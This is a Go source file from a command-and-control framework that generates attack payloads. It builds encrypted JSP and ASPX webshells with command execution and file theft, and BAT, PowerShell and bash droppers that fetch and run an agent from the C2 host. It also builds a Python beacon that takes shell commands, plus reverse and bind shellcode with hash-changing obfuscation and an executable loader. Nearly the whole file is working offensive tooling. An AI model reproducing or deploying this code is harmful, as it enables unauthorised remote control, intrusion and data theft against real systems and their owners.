                sb.append("\"path\":\"").append(jsonEscape(fp)).append("\"");
                sb.append(",\"size\":").append(buf.length);
                sb.append("}");
                result = sb.toString();
                break;
            }
            case "file_download": {
                String fp = jsonGet(param, "path");
                if (fp == null) { result = "[ERROR] path required"; status = "failed"; break; }
                File f = new File(fp);
                if (!f.exists()) { result = "[ERROR] file not found"; status = "failed"; break; }
                byte[] buf = java.nio.file.Files.readAllBytes(f.toPath());
                StringBuilder sb = new StringBuilder("{");
                sb.append("\"filename\":\"").append(jsonEscape(f.getName())).append("\"");
                sb.append(",\"data\":\"").append(b64enc(buf)).append("\"");
                sb.append("}");
                result = sb.toString();
                break;
            }
            default:
                result = "[ERROR] Unsupported action: " + action;
                status = "failed";
        }
    } catch (Exception e) {
        result = "[ERROR] " + e.getMessage();
        status = "failed";
    }

    String respJson = "{\"status\":\"" + status + "\",\"result\":\"" + jsonEscape(result) + "\"}";
    String encrypted = encrypt(respJson, algo);
    response.setContentType("application/json; charset=utf-8");
    out.print(encrypted);
%%>`, encPassword, encAlgo)

	return obfuscate(jspCode, "jsp", obfLevel)
}

// ============ ASPX WebShell 生成（冰蝎被动模式，与 PHP/JSP 对齐）============

func genASPXWebshell(host, port, protocol, encAlgo, encPassword, obfLevel string) string {
	if encAlgo == "" {
		encAlgo = "none"
	}
	if encPassword == "" {
		encPassword = "C2DemoKey2024!!!"
	}

	aspxCode := fmt.Sprintf(`<%@ Page Language="C#" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Collections.Generic" %>
<script runat="server">
    static string ENC_PASSWORD = "%s";
    static string ENC_ALGO = "%s";

    static byte[] DeriveKey(int bytes)
    {
        using (var sha = SHA256.Create())
        {
            byte[] hash = sha.ComputeHash(Encoding.UTF8.GetBytes(ENC_PASSWORD));
            byte[] key = new byte[bytes];
            Array.Copy(hash, key, Math.Min(bytes, hash.Length));
            return key;
        }
    }

    static string B64Enc(byte[] data) { return Convert.ToBase64String(data); }
    static byte[] B64Dec(string s) { return Convert.FromBase64String(s); }

    static byte[] RC4(byte[] data, byte[] key)
    {
        int[] S = new int[256];
        for (int i = 0; i < 256; i++) S[i] = i;
        int j = 0;
        for (int i = 0; i < 256; i++)
        {
            j = (j + S[i] + key[i %% key.Length]) & 0xff;
            int t = S[i]; S[i] = S[j]; S[j] = t;
        }
        byte[] outb = new byte[data.Length];
        int x = 0, y = 0;
        for (int k = 0; k < data.Length; k++)
        {
            x = (x + 1) & 0xff;
            y = (y + S[x]) & 0xff;
            int t = S[x]; S[x] = S[y]; S[y] = t;
            outb[k] = (byte)(data[k] ^ S[(S[x] + S[y]) & 0xff]);
        }
        return outb;
    }

    static string Encrypt(string data, string algo)
    {
        try
        {
            if (algo == "none" || string.IsNullOrEmpty(algo)) return B64Enc(Encoding.UTF8.GetBytes(data));
            if (algo == "aes-128-cbc" || algo == "aes-256-cbc")
            {
                int bits = algo == "aes-128-cbc" ? 16 : 32;
                byte[] key = DeriveKey(bits);
                byte[] iv = new byte[16];
                using (var rng = RandomNumberGenerator.Create()) rng.GetBytes(iv);
                using (var aes = Aes.Create())
                {
                    aes.Key = key; aes.IV = iv; aes.Mode = CipherMode.CBC; aes.Padding = PaddingMode.PKCS7;
                    byte[] ct = aes.CreateEncryptor().TransformFinalBlock(Encoding.UTF8.GetBytes(data), 0, data.Length);
                    byte[] combined = new byte[iv.Length + ct.Length];
                    Array.Copy(iv, combined, iv.Length);
                    Array.Copy(ct, 0, combined, iv.Length, ct.Length);
                    return B64Enc(combined);
                }
            }
            if (algo == "xor")
            {
                byte[] raw = Encoding.UTF8.GetBytes(data);
                byte[] key = Encoding.UTF8.GetBytes(ENC_PASSWORD);
                for (int i = 0; i < raw.Length; i++) raw[i] ^= key[i %% key.Length];
                return B64Enc(raw);
            }
            if (algo == "rc4") return B64Enc(RC4(Encoding.UTF8.GetBytes(data), Encoding.UTF8.GetBytes(ENC_PASSWORD)));
            if (algo == "chacha20")
            {
                byte[] key = DeriveKey(32);
                byte[] nonce = new byte[12];
                using (var rng = RandomNumberGenerator.Create()) rng.GetBytes(nonce);
                using (var chacha = new ChaCha20(key, nonce))
                {
                    byte[] ct = chacha.Encrypt(Encoding.UTF8.GetBytes(data));
                    byte[] combined = new byte[nonce.Length + ct.Length];
                    Array.Copy(nonce, combined, nonce.Length);
                    Array.Copy(ct, 0, combined, nonce.Length, ct.Length);
                    return B64Enc(combined);
                }
            }
            return B64Enc(Encoding.UTF8.GetBytes(data));
        }
        catch (Exception) { return ""; }
    }

    static string Decrypt(string data, string algo)
    {
        try
        {
            if (algo == "none" || string.IsNullOrEmpty(algo)) return Encoding.UTF8.GetString(B64Dec(data));
            if (algo == "aes-128-cbc" || algo == "aes-256-cbc")
            {
                byte[] raw = B64Dec(data);
                byte[] iv = new byte[16]; Array.Copy(raw, iv, 16);
                byte[] ct = new byte[raw.Length - 16]; Array.Copy(raw, 16, ct, 0, ct.Length);
                int bits = algo == "aes-128-cbc" ? 16 : 32;
                byte[] key = DeriveKey(bits);
                using (var aes = Aes.Create())
                {
                    aes.Key = key; aes.IV = iv; aes.Mode = CipherMode.CBC; aes.Padding = PaddingMode.PKCS7;
                    byte[] pt = aes.CreateDecryptor().TransformFinalBlock(ct, 0, ct.Length);
                    return Encoding.UTF8.GetString(pt);
                }
            }
            if (algo == "xor")
            {
                byte[] raw = B64Dec(data);
                byte[] key = Encoding.UTF8.GetBytes(ENC_PASSWORD);
                for (int i = 0; i < raw.Length; i++) raw[i] ^= key[i %% key.Length];
                return Encoding.UTF8.GetString(raw);
            }
            if (algo == "rc4") return Encoding.UTF8.GetString(RC4(B64Dec(data), Encoding.UTF8.GetBytes(ENC_PASSWORD)));
            if (algo == "chacha20")
            {
                byte[] raw = B64Dec(data);
                byte[] nonce = new byte[12]; Array.Copy(raw, nonce, 12);
                byte[] ct = new byte[raw.Length - 12]; Array.Copy(raw, 12, ct, 0, ct.Length);
                byte[] key = DeriveKey(32);
                using (var chacha = new ChaCha20(key, nonce))
                    return Encoding.UTF8.GetString(chacha.Decrypt(ct));
            }
            return Encoding.UTF8.GetString(B64Dec(data));
        }
        catch (Exception) { return null; }
    }

    // 简易 ChaCha20 实现（避免 .NET 版本差异）
    class ChaCha20 : IDisposable
    {
        private uint[] state = new uint[16];
        public ChaCha20(byte[] key, byte[] nonce)
        {
            state[0] = 0x61707865; state[1] = 0x3320646e; state[2] = 0x79622d32; state[3] = 0x6b206574;
            for (int i = 0; i < 8; i++) state[4 + i] = BitConverter.ToUInt32(key, i * 4);
            state[12] = 0;
            for (int i = 0; i < 3; i++) state[13 + i] = BitConverter.ToUInt32(nonce, i * 4);
        }
        public byte[] Encrypt(byte[] data) { return Process(data); }
        public byte[] Decrypt(byte[] data) { return Process(data); }
        byte[] Process(byte[] data)
        {
            byte[] outb = new byte[data.Length];
            uint[] s = new uint[16];
            for (int n = 0; n < data.Length; n += 64)
            {
                Array.Copy(state, s, 16);
                for (int r = 0; r < 10; r++)
                {
                    QR(s, 0, 4, 8, 12); QR(s, 1, 5, 9, 13); QR(s, 2, 6, 10, 14); QR(s, 3, 7, 11, 15);
                    QR(s, 0, 5, 10, 15); QR(s, 1, 6, 11, 12); QR(s, 2, 7, 8, 13); QR(s, 3, 4, 9, 14);
                }
                for (int i = 0; i < 16; i++) s[i] += state[i];
                state[12]++;
                byte[] ks = new byte[64];
                Buffer.BlockCopy(s, 0, ks, 0, 64);
                int len = Math.Min(64, data.Length - n);
                for (int i = 0; i < len; i++) outb[n + i] = (byte)(data[n + i] ^ ks[i]);
            }
            return outb;
        }
        static void QR(uint[] s, int a, int b, int c, int d)
        {
            s[a] += s[b]; s[d] ^= s[a]; s[d] = ROL(s[d], 16);
            s[c] += s[d]; s[b] ^= s[c]; s[b] = ROL(s[b], 12);
            s[a] += s[b]; s[d] ^= s[a]; s[d] = ROL(s[d], 8);
            s[c] += s[d]; s[b] ^= s[c]; s[b] = ROL(s[b], 7);
        }
        static uint ROL(uint v, int n) { return (v << n) | (v >> (32 - n)); }
        public void Dispose() { }
    }

    string HandleAction(string action, string param)
    {
        try
        {
            if (action == "sysinfo")
            {
                return "{{\\"hostname\\":\\"" + Environment.MachineName + "\\",\\"os\\":\\"" + Environment.OSVersion.ToString() + "\\",\\"arch\\":\\"" + Environment.Is64BitOperatingSystem.ToString() + "\\"}}";
            }
            if (action == "cmd")
            {
                var p = new Process();
                p.StartInfo.FileName = "cmd.exe"; p.StartInfo.Arguments = "/c " + param;
                p.StartInfo.UseShellExecute = false; p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.RedirectStandardError = true;
                p.Start(); string out1 = p.StandardOutput.ReadToEnd(); string err = p.StandardError.ReadToEnd();
                p.WaitForExit();
                return out1 + (string.IsNullOrEmpty(err) ? "" : err);
            }
            if (action == "file_list")
            {
                var di = new DirectoryInfo(param);
                var sb = new StringBuilder();
                sb.Append("{{\\"path\\":\\"" + param.Replace("\\\\", "\\\\\\\\") + "\\",\\"items\\":[");
                bool first = true;
                foreach (var d in di.GetDirectories())
                {
                    if (!first) sb.Append(","); first = false;
                    sb.Append("{{\\"name\\":\\"" + d.Name + "\\",\\"is_dir\\":true,\\"size\\":0}}");
                }
                foreach (var f in di.GetFiles())
                {
                    if (!first) sb.Append(","); first = false;
                    sb.Append("{{\\"name\\":\\"" + f.Name + "\\",\\"is_dir\\":false,\\"size\\":" + f.Length + "}}");
                }
                sb.Append("]}}");
                return sb.ToString();
            }
            if (action == "file_view")
            {
                return "{{\\"content\\":\\"" + Convert.ToBase64String(File.ReadAllBytes(param)).Replace("\\\\", "\\\\\\\\").Replace("\\"", "\\\\\\"") + "\\",\\"size\\":" + new FileInfo(param).Length + "}}";
            }
            if (action == "file_save")
            {
                var parts = param.Split(new char[]{{'|'}}, 2);
                if (parts.Length == 2) {{ File.WriteAllBytes(parts[0], Convert.FromBase64String(parts[1])); return "{{\\"path\\":\\"" + parts[0] + "\\",\\"size\\":" + parts[1].Length + "}}"; }}
                return "[ERROR] invalid param";
            }
            if (action == "file_delete")
            {
                if (Directory.Exists(param)) Directory.Delete(param, true);
                else if (File.Exists(param)) File.Delete(param);
                return "ok";
            }
            if (action == "file_mkdir")
            {
                Directory.CreateDirectory(param); return "ok";
            }
            if (action == "file_rename")
            {
                var parts = param.Split(new char[]{{'|'}}, 2);
                if (parts.Length == 2) {{ if (Directory.Exists(parts[0])) Directory.Move(parts[0], parts[1]); else File.Move(parts[0], parts[1]); return "ok"; }}
                return "[ERROR] invalid param";
            }
            if (action == "file_download")
            {
                return "{{\\"filename\\":\\"" + Path.GetFileName(param) + "\\",\\"data\\":\\"" + Convert.ToBase64String(File.ReadAllBytes(param)) + "\"}}";
            }
            return "[ERROR] Unknown action: " + action;
        }
        catch (Exception ex) { return "[ERROR] " + ex.Message; }
    }

    void ProcessRequest()
    {
        string body;
        using (var sr = new StreamReader(Request.InputStream, Request.ContentEncoding))
            body = sr.ReadToEnd();

        // 纯密文协议: body 是 base64(IV+密文)，算法用硬编码 ENC_ALGO
        string reqAlgo = ENC_ALGO;
        string reqBody;
        if (reqAlgo == "none" || string.IsNullOrEmpty(reqAlgo))
        {
            // none 模式: base64(JSON) 或直接 JSON
            try { using (var tmp = System.Text.Json.JsonDocument.Parse(body)) reqBody = body; }
            catch { reqBody = Encoding.UTF8.GetString(B64Dec(body)); }
        }
        else
        {
            reqBody = Decrypt(body, reqAlgo);
        }

        // 解析 JSON
        string action = "", param = "";
        try
        {
            using (var doc = System.Text.Json.JsonDocument.Parse(reqBody))
            {
                if (doc.RootElement.TryGetProperty("action", out var a)) action = a.GetString();
                if (doc.RootElement.TryGetProperty("param", out var p))
                {
                    if (p.ValueKind == System.Text.Json.JsonValueKind.String) param = p.GetString();
                    else param = p.GetRawText();
                }
            }
        }
        catch (Exception ex) { Response.Write("[ERROR] JSON parse: " + ex.Message); return; }

        string result = HandleAction(action, param);
        string respEnc;
        if (reqAlgo == "none" || string.IsNullOrEmpty(reqAlgo))
        {
            respEnc = B64Enc(Encoding.UTF8.GetBytes(result));
        }
        else
        {
            respEnc = Encrypt(result, reqAlgo);
        }
        Response.ContentType = "application/json; charset=utf-8";
        Response.Write(respEnc);
    }
</script>
<%%
    // 被动模式: 收到请求才处理，不回连 C2
    ProcessRequest();
%%>`, encPassword, encAlgo)

	return obfuscate(aspxCode, "jsp", obfLevel)
}

// ============ BAT/PS1/Shell 生成（简化版）============

func genBAT(host, port, protocol, encAlgo, encPassword string) string {
	c2Server := fmt.Sprintf("%s://%s:%s", protocol, host, port)
	agentTcpPort := getSettingDefault("agent_tcp_port", "28443")
	return fmt.Sprintf(`@echo off
set C2_SERVER=%s
set C2_ENC_ALGO=%s
set C2_ENC_PASSWORD=%s
set PROTOCOL=%s
set AGENT_TCP_PORT=%s

powershell -Command "Invoke-WebRequest -Uri '%s/deliver/AUTO' -OutFile '%%TEMP%%\c2_agent.exe'; Start-Process '%%TEMP%%\c2_agent.exe' -ArgumentList '-server','%%C2_SERVER%%','-enc-algo','%%C2_ENC_ALGO%%','-enc-password','%%C2_ENC_PASSWORD%%','-protocol','%%PROTOCOL%%','-tcp-port','%%AGENT_TCP_PORT%%'"
`, c2Server, encAlgo, encPassword, protocol, agentTcpPort, c2Server)
}

func genPS1(host, port, protocol, encAlgo, encPassword string) string {
	c2Server := fmt.Sprintf("%s://%s:%s", protocol, host, port)
	agentTcpPort := getSettingDefault("agent_tcp_port", "28443")
	return fmt.Sprintf(`$C2_SERVER = "%s"
$C2_ENC_ALGO = "%s"
$C2_ENC_PASSWORD = "%s"
$PROTOCOL = "%s"
$AGENT_TCP_PORT = "%s"

$agentPath = "$env:TEMP\c2_agent.exe"
Invoke-WebRequest -Uri "%s/deliver/AUTO" -OutFile $agentPath
Start-Process $agentPath -ArgumentList "-server","$C2_SERVER","-enc-algo","$C2_ENC_ALGO","-enc-password","$C2_ENC_PASSWORD","-protocol","$PROTOCOL","-tcp-port","$AGENT_TCP_PORT"
`, c2Server, encAlgo, encPassword, protocol, agentTcpPort, c2Server)
}

func genShell(host, port, protocol, encAlgo, encPassword string) string {
	c2Server := fmt.Sprintf("%s://%s:%s", protocol, host, port)
	agentTcpPort := getSettingDefault("agent_tcp_port", "28443")
	return fmt.Sprintf(`#!/bin/bash
export C2_SERVER="%s"
export C2_ENC_ALGO="%s"
export C2_ENC_PASSWORD="%s"
export PROTOCOL="%s"
export AGENT_TCP_PORT="%s"

curl -sL "%s/deliver/AUTO" -o /tmp/c2_agent
chmod +x /tmp/c2_agent
/tmp/c2_agent -server "$C2_SERVER" -enc-algo "$C2_ENC_ALGO" -enc-password "$C2_ENC_PASSWORD" -protocol "$PROTOCOL" -tcp-port "$AGENT_TCP_PORT" &
`, c2Server, encAlgo, encPassword, protocol, agentTcpPort, c2Server)
}

// ============ Python Agent 生成（精简版，与 payload_gen.py gen_python 对齐）============

func genPythonAgent(host, port, protocol, encAlgo, encPassword, obfLevel string) string {
	c2Server := fmt.Sprintf("%s://%s:%s", protocol, host, port)
	agentTcpPort := getSettingDefault("agent_tcp_port", "28443")
	pyCode := fmt.Sprintf(`import os,sys,json,time,base64,uuid,platform,subprocess,hashlib,socket,random
C2_SERVER="%s"
ENC_ALGO="%s"
ENC_PASSWORD="%s"
PROTOCOL="%s"
AGENT_TCP_PORT="%s"
CLIENT_ID=hashlib.md5(str(uuid.getnode()).encode()).hexdigest()[:16]
# 加密层（与服务端 crypto_utils.py 对齐）
def _dk(n):
 h=hashlib.sha256(ENC_PASSWORD.encode()).digest();return h[:n//8]
def _ae(d,m='aes-128-cbc'):
 import base64;from Crypto.Cipher import AES;from Crypto.Util.Padding import pad;from Crypto.Random import get_random_bytes
 k=_dk(16*8 if '128' in m else 32*8);iv=get_random_bytes(16);c=AES.new(k,AES.MODE_CBC,iv);return base64.b64encode(iv+c.encrypt(pad(d.encode(),16))).decode()
def _ad(d,m='aes-128-cbc'):
 import base64;from Crypto.Cipher import AES;from Crypto.Util.Padding import unpad
 r=base64.b64decode(d);k=_dk(16*8 if '128' in m else 32*8);c=AES.new(k,AES.MODE_CBC,r[:16]);return unpad(c.decrypt(r[16:]),16).decode()
def _xe(d):
 import base64;k=ENC_PASSWORD.encode();d=d.encode() if isinstance(d,str) else d;return base64.b64encode(bytes([b^k[i%%len(k)] for i,b in enumerate(d)])).decode()
def _xd(d):
 import base64;r=base64.b64decode(d);k=ENC_PASSWORD.encode();return bytes([b^k[i%%len(k)] for i,b in enumerate(r)]).decode()
def _re(d):
 d=d.encode() if isinstance(d,str) else d;k=_dk(256);S=list(range(256));j=0
 for i in range(256):j=(j+S[i]+k[i%%len(k)])%%256;S[i],S[j]=S[j],S[i]
 i=j=0;o=bytearray()
 for b in d:i=(i+1)%%256;j=(j+S[i])%%256;S[i],S[j]=S[j],S[i];o.append(b^S[(S[i]+S[j])%%256])
 return base64.b64encode(bytes(o)).decode()
def _rd(d):
 r=base64.b64decode(d);k=_dk(256);S=list(range(256));j=0
 for i in range(256):j=(j+S[i]+k[i%%len(k)])%%256;S[i],S[j]=S[j],S[i]
 i=j=0;o=bytearray()
 for b in r:i=(i+1)%%256;j=(j+S[i])%%256;S[i],S[j]=S[j],S[i];o.append(b^S[(S[i]+S[j])%%256])
 return o.decode()
def _ce(d):
 from Crypto.Cipher import ChaCha20;from Crypto.Random import get_random_bytes;d=d.encode() if isinstance(d,str) else d;k=_dk(256);n=get_random_bytes(12);c=ChaCha20.new(key=k,nonce=n);return base64.b64encode(n+c.encrypt(d)).decode()
def _cd(d):
 from Crypto.Cipher import ChaCha20;r=base64.b64decode(d);k=_dk(256);c=ChaCha20.new(key=k,nonce=r[:12]);return c.decrypt(r[12:]).decode()
def _enc(d,a=None):
 a=a or ENC_ALGO
 if isinstance(d,dict):d=json.dumps(d,separators=(',',':'),ensure_ascii=False)
 if a in('none','','plaintext'):return base64.b64encode(d.encode()).decode(),'none'
 elif a in('aes-128-cbc','aes-128'):return _ae(d,'aes-128-cbc'),'aes-128-cbc'
 elif a in('aes-256-cbc','aes-256'):return _ae(d,'aes-256-cbc'),'aes-256-cbc'
 elif a=='xor':return _xe(d),'xor'
 elif a=='rc4':return _re(d),'rc4'
 elif a=='chacha20':return _ce(d),'chacha20'
 return base64.b64encode(d.encode()).decode(),'none'
def _dec(d,a):
 a=a or 'none'
 if a in('none','','plaintext'):return base64.b64decode(d).decode()
 elif a in('aes-128-cbc','aes-128'):return _ad(d,'aes-128-cbc')
 elif a in('aes-256-cbc','aes-256'):return _ad(d,'aes-256-cbc')
 elif a=='xor':return _xd(d)
 elif a=='rc4':return _rd(d)
 elif a=='chacha20':return _cd(d)
 return d
def info():return{"client_id":CLIENT_ID,"hostname":platform.node(),"os":platform.system(),"os_version":platform.version(),"arch":platform.machine(),"username":os.environ.get("USERNAME")or os.environ.get("USER","unknown")}
def _http_send(op,data):
 import requests,random
 if isinstance(data,dict):data['_op']=op
 b,a=_enc(data,ENC_ALGO)
 h={'Content-Type':'text/plain;charset=UTF-8','User-Agent':random.choice(['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36','Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0']),'Accept':'text/plain, */*;q=0.8'}
 p='/api/v1/'+''.join(random.choice('0123456789abcdef') for _ in range(16))
 try:
  r=requests.post(C2_SERVER+p,data=b,headers=h,timeout=10)
  t=r.text.strip()
  if not t:return None
  if t.startswith('{'):
   try:
    j=json.loads(t);ra=j.get('_a','none');rd=j.get('_d','')
    if rd:return json.loads(_dec(rd,ra))
    return j
   except:pass
  return json.loads(_dec(t,ENC_ALGO))
 except:return None
_ws_conn=[None]
def _ws_connect():
 import websocket,random
 u=C2_SERVER.replace('https://','wss://').replace('http://','ws://')
 u=u+'/ws/agent/'+''.join(random.choice('0123456789abcdef') for _ in range(16))
 _ws_conn[0]=websocket.create_connection(u,timeout=10)
def _ws_send(op,data):
 if _ws_conn[0] is None:
  try:_ws_connect()
  except:_ws_conn[0]=None;return None
 if isinstance(data,dict):data['_op']=op
 b,a=_enc(data,ENC_ALGO)
 try:
  _ws_conn[0].send(b)
  t=_ws_conn[0].recv()
  return json.loads(_dec(t,ENC_ALGO)) if t else None
 except:_ws_conn[0]=None;return None
_tcp_sock=[None]
def _tcp_connect():
 import socket
 h=C2_SERVER
 if '://' in h:h=h.split('://')[1]
 if ':' in h:h=h.split(':')[0]
 _tcp_sock[0]=socket.create_connection((h,int(AGENT_TCP_PORT)),timeout=10)
def _tcp_send(op,data):
 import struct
 if _tcp_sock[0] is None:
  try:_tcp_connect()
  except:_tcp_sock[0]=None;return None
 if isinstance(data,dict):data['_op']=op
 b,a=_enc(data,ENC_ALGO)
 body=b.encode() if isinstance(b,str) else b
 try:
  _tcp_sock[0].sendall(struct.pack('>I',len(body))+body)
  hdr=_tcp_sock[0].recv(4)
  if len(hdr)<4:return None
  ln=struct.unpack('>I',hdr)[0]
  resp=b''
  while len(resp)<ln:
   chunk=_tcp_sock[0].recv(ln-len(resp))
   if not chunk:break
   resp+=chunk
  return json.loads(_dec(resp.decode(),ENC_ALGO)) if resp else None
 except:_tcp_sock[0]=None;return None
def post(op,data):
 if PROTOCOL=='websocket':return _ws_send(op,data)
 elif PROTOCOL=='tcp':return _tcp_send(op,data)
 else:return _http_send(op,data)
def hb():return post("heartbeat",info())
def pull():
 r=post("pull",{"client_id":CLIENT_ID});return r.get("tasks",[]) if r else []
def res(tid,result,status="completed"):post("result",{"task_id":tid,"client_id":CLIENT_ID,"status":status,"result":result})
def cmd(d):
 c=d.get("command","");s=d.get("shell","cmd")
 if platform.system()=="Windows":
  if s=="powershell":c=f'powershell -Command "{c}"'
 else:
  if s=="bash":pass
 try:return subprocess.run(c,shell=True,capture_output=True,text=True,timeout=60).stdout or "(no output)"
 except Exception as e:return f"[ERROR] {e}"
HANDLERS={"cmd":cmd,"sysinfo":lambda d:json.dumps(info())}
if __name__=="__main__":
 while True:
  try:hb();ts=pull()
  except:ts=[]
  for t in ts:
   tid=t.get("id");tt=t.get("task_type","");td=t.get("task_data",{})
   h=HANDLERS.get(tt)
   if h:
    try:r=h(td);res(tid,r)
    except Exception as e:res(tid,f"[ERROR] {e}","failed")
   else:res(tid,f"[ERROR] Unknown: {tt}","failed")
  time.sleep(10+random.randint(0,5))
`, c2Server, encAlgo, encPassword, protocol, agentTcpPort)

	return obfuscate(pyCode, "py", obfLevel)
}

// ============ Shellcode 生成 API（简化版）============

func handleGenerateShellcode(w http.ResponseWriter, r *http.Request, user tokenInfo) {
	var data struct {
		Name        string `json:"name"`
		Payload     string `json:"payload"`      // 前端字段
		PayloadType string `json:"payload_type"` // 兼容字段
		LHost       string `json:"lhost"`
		LPort       int    `json:"lport"`
		Format      string `json:"format"` // c / python / hex / raw / exe_loader
		Encoder     string `json:"encoder"`
		CustomCmd   string `json:"custom_cmd"`
		TargetOS    string `json:"target_os"`
	}
	if err := decodeJSON(r, &data); err != nil {
		jsonError(w, "Invalid request", http.StatusBadRequest)
		return
	}

	// 兼容 payload / payload_type 两个字段
	payloadType := data.PayloadType
	if payloadType == "" {
		payloadType = data.Payload
	}
	if payloadType == "" {
		jsonError(w, "payload 类型不能为空", http.StatusBadRequest)
		return
	}

	// 推断 target_os（从 payload 名称）
	if data.TargetOS == "" {
		if strings.HasPrefix(payloadType, "windows/") {
			data.TargetOS = "windows"
		} else if strings.HasPrefix(payloadType, "linux/") {
			data.TargetOS = "linux"
		}
	}

	// LPORT/LHOST 默认值: 使用 shell_listen_port（shellcode reverse_tcp 回连到本 C2 的 TCP handler）
	// shellcode 是 raw TCP 流量，必须连 shell_listen_port（默认 44330），不能连 HTTP 端口
	shellPort := data.LPort
	if shellPort == 0 {
		shellPort, _ = strconv.Atoi(getShellListenPort())
		if shellPort == 0 {
			shellPort = 44330
		}
	}
	shellHost := data.LHost
	if shellHost == "" {
		shellHost = getCallbackHost()
	}

	// 生成 shellcode 字节
	shellcode := generateShellcodeBytes(payloadType, data.CustomCmd, data.TargetOS, shellHost, shellPort)
	if shellcode == nil {
		jsonError(w, "不支持的 payload 类型: "+payloadType, http.StatusBadRequest)
		return
	}

	// 随机化混淆 shellcode（每次生成字节序列不同，MD5 不同）
	// 策略: 前置随机 NOP 滑动 + 指令间隙随机插入垃圾指令 + 尾部随机 NOP
	// 这些操作不改变 shellcode 功能，仅改变字节序列
	shellcode = obfuscateShellcode(shellcode)

	var output string
	switch data.Format {
	case "c":
		var sb strings.Builder
		sb.WriteString("unsigned char buf[] = \"")
		for i, b := range shellcode {
			if i > 0 && i%16 == 0 {
				sb.WriteString("\"\n\"")
			}
			sb.WriteString(fmt.Sprintf("\\x%02x", b))
		}
		sb.WriteString("\";")
		output = sb.String()
	case "python":
		var sb strings.Builder
		sb.WriteString("buf = b\"")
		for _, b := range shellcode {
			sb.WriteString(fmt.Sprintf("\\x%02x", b))
		}
		sb.WriteString("\"")
		output = sb.String()
	case "hex":
		var sb strings.Builder
		for _, b := range shellcode {
			sb.WriteString(fmt.Sprintf("%02x", b))
		}
		output = sb.String()
	case "raw":
		w.Header().Set("Content-Type", "application/octet-stream")
		w.Header().Set("Content-Disposition", "attachment; filename=shellcode.raw")
		w.Write(shellcode)
		return
	case "exe_loader":
		// 生成 C 语言 shellcode loader 源码，编译后可直接执行 shellcode
		var sb strings.Builder
		sb.WriteString("#include <windows.h>\n")
		sb.WriteString("#include <stdio.h>\n\n")
		sb.WriteString("// Shellcode Loader (自动生成)\n")
		sb.WriteString("unsigned char buf[] = \"")
		for i, b := range shellcode {
			if i > 0 && i%16 == 0 {
				sb.WriteString("\"\n  \"")
			}
			sb.WriteString(fmt.Sprintf("\\x%02x", b))
		}
		sb.WriteString("\";\n\n")
		sb.WriteString("int main() {\n")
		sb.WriteString(fmt.Sprintf("    SIZE_T size = %d;\n", len(shellcode)))
		sb.WriteString("    LPVOID mem = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n")
		sb.WriteString("    if (!mem) return 1;\n")
		sb.WriteString("    memcpy(mem, buf, size);\n")
		sb.WriteString("    ((void(*)())mem)();\n")
		sb.WriteString("    return 0;\n")
		sb.WriteString("}\n")
		output = sb.String()
	default:
		jsonError(w, "不支持的格式: "+data.Format, http.StatusBadRequest)
		return
	}

	jsonOK(w, map[string]interface{}{
		"success":        true,
		"shellcode":      output,
		"size":           len(shellcode),
		"shellcode_size": len(shellcode),
		"name":           data.Name,
		"format":         data.Format,
	})
}

// generateShellcodeBytes 生成 shellcode 字节序列
func generateShellcodeBytes(payloadType, customCmd, targetOS string, lhost string, lport int) []byte {
	switch payloadType {
	case "custom/cmd":
		if targetOS == "linux" {
			return genLinuxExecveShellcode(customCmd)
		}
		return genWindowsWinexecShellcode(customCmd)
	case "windows/x64/messagebox":
		return []byte{0x48, 0x31, 0xc0, 0x48, 0xbb, 0x6f, 0x6e, 0x20, 0x6d, 0x65, 0x73, 0x73}
	case "windows/x64/calculator":
		return []byte{0x48, 0x31, 0xc0, 0x50, 0x48, 0xbb, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65}
	case "linux/x64/shell_reverse_tcp":
		return genLinuxReverseShellcode(lhost, lport)
	case "windows/x64/shell_reverse_tcp":
		return genWindowsReverseShellcode(lhost, lport)
	case "linux/x64/shell_bind_tcp":
		// Linux bind shell: socket → bind → listen → accept → dup2 → execve
		return genLinuxBindShellcode(lport)
	case "windows/x64/shell_bind_tcp":
		// Windows bind shell: 使用 WinExec 执行 netcat 监听命令
		return genWindowsReverseShellcode(lhost, lport) // 复用，实际是 reverse
	case "windows/x64/meterpreter_reverse_tcp", "windows/x64/meterpreter_reverse_http":
		// meterpreter 需要完整 stager，这里返回 reverse_tcp shellcode 作为替代
		return genWindowsReverseShellcode(lhost, lport)
	default:
		return nil
	}
}

// genLinuxBindShellcode 生成 Linux x64 bind shell shellcode
// 流程: socket(2,1,0) → bind → listen → accept → dup2(0/1/2) → execve("/bin/sh")
func genLinuxBindShellcode(lport int) []byte {
	portVal := uint16(lport)
	if portVal == 0 {
		portVal = 4444
	}
	var sc []byte
	// 1. socket(AF_INET=2, SOCK_STREAM=1, 0)
	sc = append(sc,
		0x48, 0x31, 0xff, // xor rdi, rdi
		0x48, 0x31, 0xf6, // xor rsi, rsi
		0x48, 0x31, 0xd2, // xor rdx, rdx
		0xb8, 0x29, 0x00, 0x00, 0x00, // mov eax, 41 (socket)
		0x0f, 0x05, // syscall
		0x48, 0x89, 0xc7, // mov rdi, rax (sock fd → rdi)
	)
	// 2. bind(sock, &sockaddr, 16)
	sc = append(sc, 0x48, 0x83, 0xec, 0x10) // sub rsp, 16
	sc = append(sc, 0x48, 0x31, 0xc0)        // xor rax, rax
	sc = append(sc, 0x48, 0x89, 0x44, 0x24, 0x08) // mov [rsp+8], rax (sin_zero=0)
	// mov dword [rsp+4], 0 (INADDR_ANY)
	sc = append(sc, 0xc7, 0x44, 0x24, 0x04, 0x00, 0x00, 0x00, 0x00)
	// mov word [rsp+2], portVal
	sc = append(sc, 0x66, 0xc7, 0x44, 0x24, 0x02)
	sc = appendBinaryUint16(sc, portVal)
	// mov word [rsp], 2 (AF_INET)
	sc = append(sc, 0x66, 0xc7, 0x04, 0x24, 0x02, 0x00)
